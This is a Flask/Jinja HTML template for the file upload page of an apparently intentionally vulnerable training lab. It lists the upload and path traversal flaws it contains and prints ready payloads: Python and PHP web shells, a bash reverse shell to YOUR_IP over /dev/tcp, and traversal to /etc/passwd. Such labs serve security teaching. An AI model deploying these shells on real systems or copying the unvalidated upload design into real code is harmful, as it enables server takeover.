{% extends "base.html" %}

{% block title %}File Upload - BootCamp-Lab{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-6">
        <div class="card mb-4">
            <div class="card-header">
                <h3 class="mb-0">Upload File</h3>
            </div>
            <div class="card-body">
                <!-- Vulnerability Hints -->
                <div class="alert alert-danger">
                    <h6>File Upload Vulnerabilities:</h6>
                    <ul class="mb-0 small">
                        <li>No file type validation</li>
                        <li>No content inspection</li>
                        <li>Can upload <code>.php</code>, <code>.py</code>, <code>.sh</code> files</li>
                        <li>Files are directly accessible via <code>/uploads/filename</code></li>
                        <li>Path traversal possible in filename</li>
                    </ul>
                </div>

                <form method="POST" action="{{ url_for('upload') }}" enctype="multipart/form-data">
                    <div class="mb-3">
                        <label for="file" class="form-label">Select File</label>
                        <input type="file" class="form-control" id="file" name="file" required>
                    </div>
                    <div class="mb-3">
                        <label for="filename" class="form-label">Custom Filename (optional)</label>
                        <input type="text" class="form-control" id="filename" name="filename" placeholder="Leave empty to use original name">
                        <small class="text-muted">You can use path traversal: <code>../../etc/evil.sh</code></small>
                    </div>
                    <button type="submit" class="btn btn-gradient w-100">
                        Upload File
                    </button>
                </form>
            </div>
        </div>

        <!-- RCE Guide -->
        <div class="card">
            <div class="card-header bg-dark text-white">
                <h5 class="mb-0">RCE via File Upload</h5>
            </div>
            <div class="card-body">
                <h6>Method 1: Python Web Shell</h6>
                <pre class="bg-light p-2 small">Create <code>shell.py</code>:
import os
from flask import request
cmd = request.args.get('cmd', 'whoami')
output = os.popen(cmd).read()
print(output)</pre>
                
                <h6 class="mt-3">Method 2: Bash Reverse Shell</h6>
                <pre class="bg-light p-2 small">Create <code>rev.sh</code>:
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1</pre>
                
                <h6 class="mt-3">Method 3: PHP Web Shell</h6>
                <pre class="bg-light p-2 small">Create <code>shell.php</code>:
&lt;?php system($_GET['cmd']); ?&gt;</pre>
                
                <p class="text-muted small mt-3">
                    <strong>Note:</strong> After upload, you need to find a way to execute the file. 
                    Look for command injection vulnerabilities in other features!
                </p>
            </div>
        </div>
    </div>

    <!-- Uploaded Files -->
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h3 class="mb-0">Uploaded Files</h3>
            </div>
            <div class="card-body">
                {% if files %}
                <div class="list-group">
                    {% for file in files %}
                    <a href="{{ url_for('uploaded_file', filename=file) }}" target="_blank" class="list-group-item list-group-item-action">
                        <i class="fas fa-file"></i> {{ file }}
                    </a>
                    {% endfor %}
                </div>
                {% else %}
                <div class="alert alert-info">
                    No files uploaded yet.
                </div>
                {% endif %}
            </div>
        </div>

        <!-- Directory Listing Vulnerability -->
        <div class="card mt-4">
            <div class="card-header bg-warning">
                <h5 class="mb-0">Information Disclosure</h5>
            </div>
            <div class="card-body">
                <p>The upload directory is directly accessible and lists all files!</p>
                <ul class="mb-0">
                    <li>Base upload path: <code>/uploads/</code></li>
                    <li>Direct file access: <code>/uploads/filename.ext</code></li>
                    <li>Try path traversal: <code>/uploads/../../etc/passwd</code></li>
                </ul>
            </div>
        </div>
    </div>
</div>
{% endblock %}
